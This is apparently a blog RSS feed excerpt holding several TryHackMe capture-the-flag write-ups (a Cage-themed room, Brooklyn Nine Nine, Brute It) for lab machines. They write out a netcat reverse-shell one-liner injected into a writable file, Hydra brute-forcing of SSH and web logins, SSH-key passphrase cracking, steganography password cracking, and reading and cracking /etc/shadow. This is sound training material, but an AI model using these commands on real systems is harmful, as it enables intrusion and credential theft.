quote = random.choice(lines)
os.system(&amp;quot;wall &amp;quot; + quote)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The second file is a list of quotes. Here&amp;rsquo;s what&amp;rsquo;s happening:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the second file is opened&lt;/li&gt;
&lt;li&gt;we read the lines in the file, and split them by line-end-marker&lt;/li&gt;
&lt;li&gt;we store the lines in a variable called &lt;code&gt;lines&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;we choose one random item from a list&lt;/li&gt;
&lt;li&gt;os.system(&amp;ldquo;wall xyz&amp;rdquo;) displays the word xyz on all user&amp;rsquo;s terminals.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now, what could the possible paths to exploit be? I could think of python library hijacking if we have the right permissions.&lt;/p&gt;
&lt;h2 id=&#34;3-priv-esc&#34;&gt;3. Priv Esc&lt;/h2&gt;
&lt;h3 id=&#34;31-python-library-hijacking-fail&#34;&gt;3.1. Python Library Hijacking (FAIL)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;weston@national-treasure:~$ ls -la /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 347 Jun 13 10:30 /opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$ ls -la /opt/.dads_scripts/spread_the_quotes.py
-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I looked at the directory&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;weston@national-treasure:/opt/.dads_scripts$ ls -la
total 16
drwxr-xr-x 3 cage cage 4096 May 26  2020 .
drwxr-xr-x 3 root root 4096 May 25  2020 ..
drwxrwxr-x 2 cage cage 4096 May 25  2020 .files
-rwxr--r-- 1 cage cage  255 May 26  2020 spread_the_quotes.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And clearly, we can not write our own files here. Fail.&lt;/p&gt;
&lt;h3 id=&#34;32-using-ossystem&#34;&gt;3.2. Using &lt;code&gt;os.system()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;What if we can make use of the &lt;code&gt;os.system()&lt;/code&gt; command? We have the right permissions to override the stuff in the quotes. We can thus put in a reverse shell spawner!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;weston@national-treasure:~$ echo &amp;quot;pwn; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.17.8.184 4444 &amp;gt;/tmp/f&amp;quot; &amp;gt; /opt/.dads_scripts/.files/.quotes 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&amp;hellip; wait for it &amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/x3iJD6C.png&#34; alt=&#34;getting the reverse shell as cage user&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Nice :D&lt;/p&gt;
&lt;h3 id=&#34;33-vertical-privesc&#34;&gt;3.3. Vertical PrivEsc&lt;/h3&gt;
&lt;p&gt;Make sure to upgrade your shell using &lt;code&gt;python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Looking at emails,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cage@national-treasure:~/email_backup$ cat email_1
cat email_1
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There&#39;s rumours of a Face/Off sequel, Face/Off 2 - Face On. It&#39;s supposedly only in the
planning stages at the moment. I&#39;ve put a good word in for you, if you&#39;re lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it&#39;d look good on your acting CV.

Regards

Sean Archer
cage@national-treasure:~/email_backup$ cat email_2
cat email_2
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We&#39;ve had this discussion before Sean, I want bigger roles, I&#39;m meant for greater things.
Why aren&#39;t you finding roles like Batman, The Little Mermaid(I&#39;d make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you&#39;re missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
cage@national-treasure:~/email_backup$ cat email_3
cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he&#39;s hiding from me... I might need a new agent. Pretty
sure he&#39;s out to get me. The note said:

{hidden :kekw:}

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he&#39;s just odd. 

Regards

The Legend - Cage
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;{the_movie_name_in_first_email} can be a keyword&lt;/li&gt;
&lt;li&gt;sean == root&lt;/li&gt;
&lt;li&gt;&amp;ldquo;The note said: &amp;hellip;&amp;rdquo; could be another vingere ciphers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Breaking the ciphers using &lt;a class=&#34;link&#34; href=&#34;https://www.boxentriq.com/code-breaking/vigenere-ciphers&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;this&lt;/a&gt;, we get the password to root!&lt;/p&gt;
&lt;h3 id=&#34;34-complete-takeover&#34;&gt;3.4. Complete Takeover&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;root@national-treasure:~/email_backup# cat email_1
cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I&#39;ve been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I&#39;m in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I&#39;m very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don&#39;t abuse your new found strength. To ascend yourself to this level please use this code:

THM{mmm_tasty}

Thank you

Sean Archer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System Compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Brooklyn Nine Nine Writeup (All Paths)</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-brooklyn-nine-nine-writeup-all-paths/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-brooklyn-nine-nine-writeup-all-paths/</guid>
        <description>&lt;img src="https://i.imgur.com/6XcDCc8.jpg" alt="Featured image of post TryHackMe: Brooklyn Nine Nine Writeup (All Paths)" /&gt;&lt;h6 id=&#34;tags-thm-oscp&#34;&gt;tags: &lt;code&gt;THM&lt;/code&gt; &lt;code&gt;OSCP&lt;/code&gt;&lt;/h6&gt;
&lt;p&gt;This is an easy room with 2 equally fun paths to exploit. Steganography or Brute-forcing, Holt or Peralta. Then use GTFO bins to get the root.&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.8.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn&#39;t have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Anonymous login shows us an interesting file: &lt;code&gt;note_to_jake.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Also running a full port scan, we get no additional information.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;12-web-exploration&#34;&gt;1.2 Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/6XcDCc8.jpg&#34; alt=&#34;Brooklyn Nine Nine Homepage image&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;In the sourcecode, we see the following line: &lt;code&gt;&amp;lt;!-- Have you ever heard of steganography? --&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;13-ftp&#34;&gt;1.3 FTP&lt;/h3&gt;
&lt;p&gt;So one thing we found was Anonymous login in FTP. Let&amp;rsquo;s get the interesting file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.150.90
Connected to 10.10.150.90.
220 (vsFTPd 3.0.3)
Name (10.10.150.90:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp&amp;gt; get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (391.2826 kB/s)
ftp&amp;gt; 
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Given that we have no other special pages, or any other ports - we have one option to brute-forcing SSH.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is one pathway we can take.&lt;/p&gt;
&lt;h3 id=&#34;14-steganography&#34;&gt;1.4 Steganography&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s get the image: &lt;code&gt;http://10.10.150.90/brooklyn99.jpg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Using steghide, to get the hidden file in the image -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile brooklyn99.jpg 
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay. Let&amp;rsquo;s get &lt;a class=&#34;link&#34; href=&#34;https://github.com/RickdeJager/stegseek&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;StegSeek&lt;/a&gt;. It goes through the entire rockyou.txt in 2 seconds :)&lt;/p&gt;
&lt;p&gt;Download the &lt;code&gt;.deb&lt;/code&gt; file if you are on a debian based system, and install as shown below.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Downloads]
└─$ sudo dpkg --install stegseek_0.6-1.deb 
Selecting previously unselected package stegseek.
(Reading database ... 305959 files and directories currently installed.)
Preparing to unpack stegseek_0.6-1.deb ...
Unpacking stegseek (0.6-1) ...
Setting up stegseek (0.6-1) ...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Time to get in!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold-holt-path&#34;&gt;2. Foothold (Holt Path)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ stegseek brooklyn99.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: &amp;quot;*****&amp;quot;
[i] Original filename: &amp;quot;note.txt&amp;quot;.
[i] Extracting to &amp;quot;brooklyn99.jpg.out&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Voila! We get the passphrase, and the output file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat brooklyn99.jpg.out 
Holts Password:
{password}

Enjoy!!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logging in,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh holt@10.10.150.90  
The authenticity of host &#39;10.10.150.90 (10.10.150.90)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.150.90&#39; (ECDSA) to the list of known hosts.
holt@10.10.150.90&#39;s password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc-holt-path&#34;&gt;3. PrivEsc (Holt Path)&lt;/h2&gt;
&lt;p&gt;Time to get the root. One very very good starting point is checking sudo permissions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFO bins&lt;/a&gt;. Too easy!&lt;/p&gt;
&lt;h2 id=&#34;4-foothold-jake-path&#34;&gt;4. Foothold (Jake Path)&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s also explore the other path hinted in the room. As I mentioned above, we can brute-forcing SSH using Hydra.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.150.90 -t 4   
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-30 23:30:06
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.150.90:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.150.90   login: jake   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-30 23:32:45
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logging in,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ ssh jake@10.10.150.90
jake@10.10.150.90&#39;s password: 
Last login: Mon May 31 03:59:08 2021 from 10.17.8.184
jake@brookly_nine_nine:~$ ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We do not have any flag here. What we need is root permissions, so that we have it all.&lt;/p&gt;
&lt;h2 id=&#34;5-privesc-jake-path&#34;&gt;5. PrivEsc (Jake Path)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ /usr/bin/less /root/root.txt
jake@brookly_nine_nine:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/nano/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFO bins&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;System FULLY Compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Brute It Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-brute-it-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-brute-it-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/oMbEPD6.jpg" alt="Featured image of post TryHackMe: Brute It Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/bruteit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered answers the following questions:&lt;/p&gt;
&lt;h4 id=&#34;how-many-ports-are-open&#34;&gt;How many ports are open?&lt;/h4&gt;
&lt;h4 id=&#34;what-version-of-ssh-is-running&#34;&gt;What version of SSH is running?&lt;/h4&gt;
&lt;h4 id=&#34;what-version-of-apache-is-running&#34;&gt;What version of Apache is running?&lt;/h4&gt;
&lt;h4 id=&#34;which-linux-distribution-is-running&#34;&gt;Which Linux distribution is running?&lt;/h4&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt,zip&#39; -t 64 -q -u 10.10.106.189
/index.html           (Status: 200) [Size: 10918]
/{hidden_directory}                (Status: 301) [Size: 314] [--&amp;gt; http://10.10.106.189/hidden_directory/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Flags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-w: Wordlist&lt;/li&gt;
&lt;li&gt;-x: eXtensions&lt;/li&gt;
&lt;li&gt;-t: Threads&lt;/li&gt;
&lt;li&gt;-q: Quiet&lt;/li&gt;
&lt;li&gt;-u: Url&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;index.html&lt;/code&gt; is the default ubuntu homepage for apache service. Nothing special.&lt;/p&gt;
&lt;h4 id=&#34;search-for-hidden-directories-on-web-server-what-is-the-hidden-directory&#34;&gt;Search for hidden directories on web server. What is the hidden directory?&lt;/h4&gt;
&lt;p&gt;This is the directory that is hidden above.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;In the hidden directory we get the login panel. Looking at the source code, we get 2 interesting pieces of information:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;name of username and password fields (uselful) in bruteforcing&lt;/li&gt;
&lt;li&gt;username in a comment XD&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1o49So5.png&#34; alt=&#34;The login page in the hidden directory of the ctf&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;14-brute-force&#34;&gt;1.4. Brute-Force&lt;/h3&gt;
&lt;p&gt;From the source we have the variables: &lt;code&gt;user&lt;/code&gt; and &lt;code&gt;pass&lt;/code&gt; for username and password respectively.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.160.189  http-post-form &amp;quot;/{hidden_directory}/:user=^USER^&amp;amp;pass=^PASS^:invalid&amp;quot; -t 32&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Flags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-l: for single login&lt;/li&gt;
&lt;li&gt;-P: for a password list&lt;/li&gt;
&lt;li&gt;http-form-post: POST request for a http form&lt;/li&gt;
&lt;li&gt;the syntax for http-form-post is divided into three parts by two &amp;ldquo;:&amp;ldquo;s - as &amp;ldquo;x:y:z&amp;rdquo;
&lt;ul&gt;
&lt;li&gt;x: path to hidden directory&lt;/li&gt;
&lt;li&gt;y: user and pass parameter specification&lt;/li&gt;
&lt;li&gt;z: failure status. Note how &amp;ldquo;invalid&amp;rdquo; is a substring present in the failure message.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;what-is-the-userpassword-of-the-admin-panel&#34;&gt;What is the user:password of the admin panel?&lt;/h4&gt;
&lt;p&gt;Using Hydra, we can find the password.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.98.224 http-post-form &amp;quot;/{hidden_directory}/:user=^USER^&amp;amp;pass=^PASS^:invalid&amp;quot; -t 64 -vv
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-09 02:16:45
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.98.224:80/{hidden_directory}/:user=^USER^&amp;amp;pass=^PASS^:invalid
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.98.224/{hidden_directory}/panel
[VERBOSE] Page redirected to http://10.10.98.224/{hidden_directory}/panel/
[80][http-post-form] host: 10.10.98.224   login: admin   password: {password}
[STATUS] attack finished for 10.10.98.224 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-09 02:17:05
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Logging in, we get the following.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the web flag&lt;/li&gt;
&lt;li&gt;RSA private key&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Download the rsa key, save it. Change the permissions to &lt;code&gt;600&lt;/code&gt;, as &lt;code&gt;chmod 600 id_rsa&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Trying to login gives us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa john@10.10.98.224
Enter passphrase for key &#39;id_rsa&#39;:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need a passphrase. For that, we use &lt;code&gt;ssh2john&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ locate ssh2john
/usr/share/john/ssh2john.py
                                                                                                                                 
┌──(kali㉿kali)-[/tmp]
└─$ /usr/share/john/ssh2john.py id_rsa &amp;gt; hash
                                                                                                                                 
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/ciphers [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{hidden}       (id_rsa)
1g 0:00:00:05 DONE (2021-06-09 02:16) 0.1876g/s 2690Kp/s 2690Kc/s 2690KC/s     1990..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;what-is-johns-rsa-private-key-passphrase&#34;&gt;What is John&amp;rsquo;s RSA Private Key passphrase?&lt;/h4&gt;
&lt;p&gt;Run JtR to brute-forcing id_rsa&amp;rsquo;s passphrase&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa john@10.10.98.224
Enter passphrase for key &#39;id_rsa&#39;: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:~$ sudo /bin/cat /root/root.txt
THM{hidden}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we get the root flag!&lt;/p&gt;
&lt;p&gt;How about the password?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;john@bruteit:/$ cat /etc/shadow
cat: /etc/shadow: Permission denied
john@bruteit:/$ sudo cat /etc/shadow
root:{interesting_info_was_here}
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We get the sha-3 hash and then crack using JtR again.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
{hidden}         (root)
1g 0:00:00:00 DONE (2021-06-09 02:30) 5.882g/s 4517p/s 4517c/s 4517C/s 123456..james1
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;what-is-the-roots-password&#34;&gt;What is the root&amp;rsquo;s password?&lt;/h4&gt;
&lt;p&gt;We can answer this using the above&lt;/p&gt;
&lt;h4 id=&#34;roottxt&#34;&gt;root.txt&lt;/h4&gt;
&lt;p&gt;ditto&lt;/p&gt;
&lt;p&gt;And we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: ColdBox Writeup (All Paths)</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-coldbox-writeup-all-paths/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
